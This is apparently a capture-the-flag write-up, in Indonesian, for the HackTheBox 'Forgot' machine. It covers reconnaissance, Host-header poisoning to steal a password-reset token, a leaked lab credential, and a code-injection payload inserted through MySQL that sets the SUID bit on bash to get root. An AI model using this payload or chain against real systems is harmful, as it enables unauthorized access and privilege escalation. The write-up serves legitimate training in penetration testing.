---
title: "HackTheBox - Forgot WriteUps"
date: 2023-02-21 02:00:00 +07:00
categories: [WriteUps]
tags: [ctf, hackthebox, pentest, writeups]
image: 
---

# HackTheBox Forgot WriteUps

Nmap Scanning:
```
$ nmap -sC -sV 10.10.11.188
Starting Nmap 7.93 ( https://nmap.org ) at 2023-02-20 10:48 WIB
Nmap scan report for forgot.htb (10.10.11.188)
Host is up (0.048s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh 	OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 48add5b83a9fbcbef7e8201ef6bfdeae (RSA)
|   256 b7896c0b20ed49b2c1867c2992741c1f (ECDSA)
|_  256 18cd9d08a621a8b8b6f79f8d405154fb (ED25519)
80/tcp open  http	Werkzeug/2.1.2 Python/3.8.10
| fingerprint-strings:
|   FourOhFourRequest:
| 	HTTP/1.1 404 NOT FOUND
| 	Server: Werkzeug/2.1.2 Python/3.8.10
| 	Date: Mon, 20 Feb 2023 03:49:00 GMT
| 	Content-Type: text/html; charset=utf-8
| 	Content-Length: 207
| 	X-Varnish: 163850
| 	Age: 0
| 	Via: 1.1 varnish (Varnish/6.2)
| 	Connection: close
| 	<!doctype html>
| 	<html lang=en>
| 	<title>404 Not Found</title>
| 	<h1>Not Found</h1>
| 	<p>The requested URL was not found on the server. If you entered the URL manually please check your spelling and try again.</p>
|   GetRequest:
| 	HTTP/1.1 302 FOUND
| 	Server: Werkzeug/2.1.2 Python/3.8.10
| 	Date: Mon, 20 Feb 2023 03:48:55 GMT
| 	Content-Type: text/html; charset=utf-8
| 	Content-Length: 219
| 	Location: http://127.0.0.1
| 	X-Varnish: 33176
| 	Age: 0
| 	Via: 1.1 varnish (Varnish/6.2)
| 	Connection: close
| 	<!doctype html>
| 	<html lang=en>
| 	<title>Redirecting...</title>
| 	<h1>Redirecting...</h1>
| 	<p>You should be redirected automatically to the target URL: <a href="http://127.0.0.1">http://127.0.0.1</a>. If not, click the link.
|   HTTPOptions:
| 	HTTP/1.1 200 OK
| 	Server: Werkzeug/2.1.2 Python/3.8.10
| 	Date: Mon, 20 Feb 2023 03:48:55 GMT
| 	Content-Type: text/html; charset=utf-8
| 	Allow: HEAD, GET, OPTIONS
| 	Content-Length: 0
| 	X-Varnish: 163846
| 	Age: 0
| 	Via: 1.1 varnish (Varnish/6.2)
| 	Accept-Ranges: bytes
| 	Connection: close
|   RTSPRequest, SIPOptions:
|_	HTTP/1.1 400 Bad Request
|_http-title: Login
|_http-server-header: Werkzeug/2.1.2 Python/3.8.10
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port80-TCP:V=7.93%I=7%D=2/20%Time=63F2EDA7%P=x86_64-pc-linux-gnu%r(GetR
SF:equest,1E2,"HTTP/1\.1\x20302\x20FOUND\r\nServer:\x20Werkzeug/2\.1\.2\x2
SF:0Python/3\.8\.10\r\nDate:\x20Mon,\x2020\x20Feb\x202023\x2003:48:55\x20G
SF:MT\r\nContent-Type:\x20text/html;\x20charset=utf-8\r\nContent-Length:\x
SF:20219\r\nLocation:\x20http://127\.0\.0\.1\r\nX-Varnish:\x2033176\r\nAge
SF::\x200\r\nVia:\x201\.1\x20varnish\x20\(Varnish/6\.2\)\r\nConnection:\x2
SF:0close\r\n\r\n<!doctype\x20html>\n<html\x20lang=en>\n<title>Redirecting
SF:\.\.\.</title>\n<h1>Redirecting\.\.\.</h1>\n<p>You\x20should\x20be\x20r
SF:edirected\x20automatically\x20to\x20the\x20target\x20URL:\x20<a\x20href
SF:=\"http://127\.0\.0\.1\">http://127\.0\.0\.1</a>\.\x20If\x20not,\x20cli
SF:ck\x20the\x20link\.\n")%r(HTTPOptions,118,"HTTP/1\.1\x20200\x20OK\r\nSe
SF:rver:\x20Werkzeug/2\.1\.2\x20Python/3\.8\.10\r\nDate:\x20Mon,\x2020\x20
SF:Feb\x202023\x2003:48:55\x20GMT\r\nContent-Type:\x20text/html;\x20charse
SF:t=utf-8\r\nAllow:\x20HEAD,\x20GET,\x20OPTIONS\r\nContent-Length:\x200\r
SF:\nX-Varnish:\x20163846\r\nAge:\x200\r\nVia:\x201\.1\x20varnish\x20\(Var
SF:nish/6\.2\)\r\nAccept-Ranges:\x20bytes\r\nConnection:\x20close\r\n\r\n"
SF:)%r(RTSPRequest,1C,"HTTP/1\.1\x20400\x20Bad\x20Request\r\n\r\n")%r(Four
SF:OhFourRequest,1BF,"HTTP/1\.1\x20404\x20NOT\x20FOUND\r\nServer:\x20Werkz
SF:eug/2\.1\.2\x20Python/3\.8\.10\r\nDate:\x20Mon,\x2020\x20Feb\x202023\x2
SF:003:49:00\x20GMT\r\nContent-Type:\x20text/html;\x20charset=utf-8\r\nCon
SF:tent-Length:\x20207\r\nX-Varnish:\x20163850\r\nAge:\x200\r\nVia:\x201\.
SF:1\x20varnish\x20\(Varnish/6\.2\)\r\nConnection:\x20close\r\n\r\n<!docty
SF:pe\x20html>\n<html\x20lang=en>\n<title>404\x20Not\x20Found</title>\n<h1
SF:>Not\x20Found</h1>\n<p>The\x20requested\x20URL\x20was\x20not\x20found\x
SF:20on\x20the\x20server\.\x20If\x20you\x20entered\x20the\x20URL\x20manual
SF:ly\x20please\x20check\x20your\x20spelling\x20and\x20try\x20again\.</p>\
SF:n")%r(SIPOptions,1C,"HTTP/1\.1\x20400\x20Bad\x20Request\r\n\r\n");
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 140.78 seconds
```
Scanning directory dengan feroxbuster:
```
feroxbuster -u http://10.10.11.188 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-big.txt -x php,html,txt,git,pdf -q

200      GET      246l      484w     5187c http://10.10.11.188/
200      GET      246l      484w     5189c http://10.10.11.188/login
302      GET        5l       22w      189c http://10.10.11.188/home => /
302      GET        5l       22w      189c http://10.10.11.188/tickets => /
200      GET      261l      517w     5523c http://10.10.11.188/reset
```
Kita disini mendapatkan request yang didapat dari intercept burp suite
![image](https://media.discordapp.net/attachments/740245586095112242/1077443582065135666/image.png)

Kita mencoba mengganti Host header diganti dengan ip kita dengan menyambungkan dengan netcat
![image](https://media.discordapp.net/attachments/740245586095112242/1077443777767153754/image.png)

Dari hasil connect netcat kita mendapatkan ``/reset?token=`` yang berisi kredential token reset
![image](https://media.discordapp.net/attachments/740245586095112242/1077444018503417936/image.png)

Kita menggunakan token kredential tersebut untuk mereset password dan hasilnya success
![image](https://media.discordapp.net/attachments/740245586095112242/1077444241032237166/image.png)

Setelah itu kita mencoba membuat post request yang sebelumnya kita dapat dari dashboard login
![image](https://media.discordapp.net/attachments/740245586095112242/1077444390416560168/image.png)

Hasil dari create post requests kalau kita membuka admin tiket dengan cara inpect elemen dan enable menu admin tiketnya kita akan mendapatkan tampilan seperti dibawah yang berisi kredential juga pada reason
![image](https://media.discordapp.net/attachments/740245586095112242/1077444535841476638/image.png)

Berikut ini kredential yang kita dapatkan dari menu admin tiket tadi
```bash
diego:dCb#1!x0%gjq
```
Setelah itu kita mencoba login ke SSH dan berhasil login pada SSH tersebut
![image](https://media.discordapp.net/attachments/740245586095112242/1077444895817617438/image.png)

Kita mencoba mengecek sudoers apakah ada untuk privileges disini terdapat file python yang dapat kita jalankan tanpa memasukan password
![image](https://media.discordapp.net/attachments/740245586095112242/1077445093348360332/image.png)

Kita mencoba membaca file python tersebut
```python
diego@forgot:~$ cat /opt/security/ml_security.py
#!/usr/bin/python3
import sys
import csv
import pickle
import mysql.connector
import requests
import threading
import numpy as np
import pandas as pd
import urllib.parse as parse
from urllib.parse import unquote
from sklearn import model_selection
from nltk.tokenize import word_tokenize
from sklearn.linear_model import LogisticRegression
from gensim.models.doc2vec import Doc2Vec, TaggedDocument
from tensorflow.python.tools.saved_model_cli import preprocess_input_exprs_arg_string

np.random.seed(42)

f1 = '/opt/security/lib/DecisionTreeClassifier.sav'
f2 = '/opt/security/lib/SVC.sav'
f3 = '/opt/security/lib/GaussianNB.sav'
f4 = '/opt/security/lib/KNeighborsClassifier.sav'
f5 = '/opt/security/lib/RandomForestClassifier.sav'
f6 = '/opt/security/lib/MLPClassifier.sav'

# load the models from disk
loaded_model1 = pickle.load(open(f1, 'rb'))
loaded_model2 = pickle.load(open(f2, 'rb'))
loaded_model3 = pickle.load(open(f3, 'rb'))
loaded_model4 = pickle.load(open(f4, 'rb'))
loaded_model5 = pickle.load(open(f5, 'rb'))
loaded_model6 = pickle.load(open(f6, 'rb'))
model= Doc2Vec.load("/opt/security/lib/d2v.model")

# Create a function to convert an array of strings to a set of features
def getVec(text):
	features = []
	for i, line in enumerate(text):
    	test_data = word_tokenize(line.lower())
    	v1 = model.infer_vector(test_data)
    	featureVec = v1
    	lineDecode = unquote(line)
    	lowerStr = str(lineDecode).lower()
    	feature1 = int(lowerStr.count('link'))
    	feature1 += int(lowerStr.count('object'))
    	feature1 += int(lowerStr.count('form'))
    	feature1 += int(lowerStr.count('embed'))
    	feature1 += int(lowerStr.count('ilayer'))
    	feature1 += int(lowerStr.count('layer'))
    	feature1 += int(lowerStr.count('style'))
    	feature1 += int(lowerStr.count('applet'))
    	feature1 += int(lowerStr.count('meta'))
    	feature1 += int(lowerStr.count('img'))
    	feature1 += int(lowerStr.count('iframe'))
    	feature1 += int(lowerStr.count('marquee'))
    	# add feature for malicious method count
    	feature2 = int(lowerStr.count('exec'))
    	feature2 += int(lowerStr.count('fromcharcode'))
    	feature2 += int(lowerStr.count('eval'))
    	feature2 += int(lowerStr.count('alert'))
    	feature2 += int(lowerStr.count('getelementsbytagname'))
    	feature2 += int(lowerStr.count('write'))
    	feature2 += int(lowerStr.count('unescape'))
    	feature2 += int(lowerStr.count('escape'))
    	feature2 += int(lowerStr.count('prompt'))
    	feature2 += int(lowerStr.count('onload'))
    	feature2 += int(lowerStr.count('onclick'))
    	feature2 += int(lowerStr.count('onerror'))
    	feature2 += int(lowerStr.count('onpage'))
    	feature2 += int(lowerStr.count('confirm'))
    	# add feature for ".js" count
    	feature3 = int(lowerStr.count('.js'))
    	# add feature for "javascript" count
    	feature4 = int(lowerStr.count('javascript'))
    	# add feature for length of the string
    	feature5 = int(len(lowerStr))
    	# add feature for "<script"  count
    	feature6 = int(lowerStr.count('script'))
    	feature6 += int(lowerStr.count('<script'))
    	feature6 += int(lowerStr.count('&lt;script'))
    	feature6 += int(lowerStr.count('%3cscript'))
    	feature6 += int(lowerStr.count('%3c%73%63%72%69%70%74'))
    	# add feature for special character count
    	feature7 = int(lowerStr.count('&'))
    	feature7 += int(lowerStr.count('<'))
    	feature7 += int(lowerStr.count('>'))
    	feature7 += int(lowerStr.count('"'))
    	feature7 += int(lowerStr.count('\''))
    	feature7 += int(lowerStr.count('/'))
    	feature7 += int(lowerStr.count('%'))
    	feature7 += int(lowerStr.count('*'))
    	feature7 += int(lowerStr.count(';'))
    	feature7 += int(lowerStr.count('+'))
    	feature7 += int(lowerStr.count('='))
    	feature7 += int(lowerStr.count('%3C'))
    	# add feature for http count
    	feature8 = int(lowerStr.count('http'))
   	 
    	# append the features
    	featureVec = np.append(featureVec,feature1)
    	featureVec = np.append(featureVec,feature2)
    	featureVec = np.append(featureVec,feature3)
    	featureVec = np.append(featureVec,feature4)
    	featureVec = np.append(featureVec,feature5)
    	featureVec = np.append(featureVec,feature6)
    	featureVec = np.append(featureVec,feature7)
    	featureVec = np.append(featureVec,feature8)
    	features.append(featureVec)
	return features


# Grab links
conn = mysql.connector.connect(host='localhost',database='app',user='diego',password='dCb#1!x0%gjq')
cursor = conn.cursor()
cursor.execute('select reason from escalate')
r = [i[0] for i in cursor.fetchall()]
conn.close()
data=[]
for i in r:
    	data.append(i)
Xnew = getVec(data)

#1 DecisionTreeClassifier
ynew1 = loaded_model1.predict(Xnew)
#2 SVC
ynew2 = loaded_model2.predict(Xnew)
#3 GaussianNB
ynew3 = loaded_model3.predict(Xnew)
#4 KNeighborsClassifier
ynew4 = loaded_model4.predict(Xnew)
#5 RandomForestClassifier
ynew5 = loaded_model5.predict(Xnew)
#6 MLPClassifier
ynew6 = loaded_model6.predict(Xnew)

# show the sample inputs and predicted outputs
def assessData(i):
	score = ((.175*ynew1[i])+(.15*ynew2[i])+(.05*ynew3[i])+(.075*ynew4[i])+(.25*ynew5[i])+(.3*ynew6[i]))
	if score >= .5:
    	try:
            	preprocess_input_exprs_arg_string(data[i],safe=False)
    	except:
            	pass

for i in range(len(Xnew)):
 	t = threading.Thread(target=assessData, args=(i,))
# 	t.daemon = True
 	t.start()
```

Dari file python kita terdapat login mysql dengan kredential dibawah. Login Mysql 
```bash
mysql.connector.connect(host="localhost",database="app",user="diego",password="dCb#1!x0%gjq"
```
Setelah itu kita mencoba login pada Mysql dan ikuti payload dibawah untuk mendapatkan Root Access
![image](https://media.discordapp.net/attachments/740245586095112242/1077447416703373332/image.png)
![image](https://media.discordapp.net/attachments/740245586095112242/1077447592587300874/image.png)

Disini kita menggunakan root privileges dari [Payloads](https://github.com/advisories/GHSA-75c9-jrh4-79mc)
```bash
insert into escalate values ("a","b","c",'hello=exec("""\nimport os\nos.system("chmod +s /usr/bin/bash")""")');
```
![image](https://media.discordapp.net/attachments/740245586095112242/1077447965121204304/image.png)
![image](https://media.discordapp.net/attachments/740245586095112242/1077447989662072915/image.png)
